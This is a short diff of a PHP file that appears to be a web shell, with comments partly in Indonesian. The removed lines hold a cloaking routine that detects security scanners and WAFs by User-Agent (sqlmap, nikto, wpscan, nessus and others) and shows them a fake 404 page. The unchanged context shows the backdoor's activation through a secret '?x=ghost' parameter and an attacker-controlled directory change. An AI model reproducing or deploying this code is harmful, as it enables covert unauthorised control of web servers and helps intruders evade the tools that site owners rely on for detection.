@@ -10,25 +10,6 @@ header('Pragma: no-cache');
 
 session_start();
 
-// 1. Fake User-Agent detection (block scanner/WAF)
-$blocked_agents = [
-    'modsecurity', 'cloudflare', 'waf', 'bot', 'crawler', 
-    'scanner', 'nmap', 'sqlmap', 'nikto', 'wpscan', 'wordfence',
-    'burp', 'zap', 'acunetix', 'nessus', 'openvas'
-];
-$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-foreach ($blocked_agents as $bad) {
-    if (stripos($ua, $bad) !== false) {
-        http_response_code(404);
-        echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head>";
-        echo "<body style='background:#0a0a0a; color:#ccc; text-align:center; padding:50px;'>";
-        echo "<h1 style='color:#ff4444'>404 Not Found</h1>";
-        echo "<p>The requested URL was not found on this server.</p>";
-        echo "</body></html>";
-        exit();
-    }
-}
-
 // === Aktifasi ===
 if (isset($_GET['x']) && $_GET['x'] === 'ghost') {
     if (isset($_GET['d'])) @chdir($_GET['d']);
